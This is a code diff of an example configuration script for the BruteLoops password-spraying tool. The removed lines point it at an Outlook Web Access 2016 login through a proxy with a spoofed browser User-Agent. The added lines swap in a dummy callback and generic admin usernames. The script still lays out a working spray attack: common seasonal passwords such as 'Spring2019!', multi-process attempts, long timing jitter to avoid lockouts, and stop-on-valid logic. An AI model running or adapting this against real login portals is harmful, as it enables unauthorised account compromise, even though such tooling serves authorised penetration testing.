@@ -4,7 +4,6 @@ from BruteLoops.jitter import Jitter
 from BruteLoops.brute import Horizontal
 from BruteLoops.config import Config
 from BruteLoops.logging import GENERAL_EVENTS,logging
-from ***REMOVED*** import OWA2016
 
 # ========================
 # USER INTERFACE SHORTCUTS
@@ -51,19 +50,15 @@ def fake(username, password, *args, **kwargs):
     else:
         return [0,username,password]
 
-config = Config()
-proxies = {'https':'http://***REMOVED***:31280'}
-headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'}
-config.authentication_callback = OWA2016('***REMOVED***
-        proxies=proxies,
-        headers=headers)
+config = Config() # Initialize a configuration object
+config.authentication_callback = fake # Set the authentication callback
                                      
 # ============================
 # AUTHENTICATION CONFIGURATION
 # ============================
-config.process_count = 8      
-config.max_auth_tries = 1    
-config.stop_on_valid = True 
+config.process_count = 8 # Maximum number of processes to use 
+config.max_auth_tries = 1 # Max number of auth attempts before sleeping
+config.stop_on_valid = True # Stop after valid credentials are recovered
 
 # ====================
 # JITTER CONFIGURATION
@@ -74,16 +69,16 @@ config.max_auth_jitter = Jitter(min='45m',max='50m')
 # ====================
 # OUTPUT CONFIGURATION
 # ====================
-config.db_file = '***REMOVED***'    
+config.db_file = 'test_brute.sqlite'    
 
-# LOGGING LEVELS
+# LOGGING LEVELS # Optional
 config.log_valid = True             
 config.log_invalid = True          
 config.log_general = True         
 
-# LOG DESTINATIONS
+# LOG DESTINATIONS # Also optional
 config.log_stdout = True         
-config.log_file = '***REMOVED***.txt'
+config.log_file = 'brute_log.txt'
 
 # ===============================
 # EXCEPTION HANDLER CONFIGURATION
@@ -104,9 +99,9 @@ try:
     logger.log(GENERAL_EVENTS,'Initializing attack')
     bf = Horizontal(config)
     bf.launch(
-        usernames='fl_ln.final',
+        usernames=['admin','administrator','super-admin'],
         passwords=['Password1','Password#1','Password1!','Password123',
-            'Spring2019!','Summer2019!','Winter2018!','***REMOVED***','***REMOVED***']
+            'Spring2019!','Summer2019!','Winter2018!']
     )
     logger.log(GENERAL_EVENTS,'Attack complete')
     
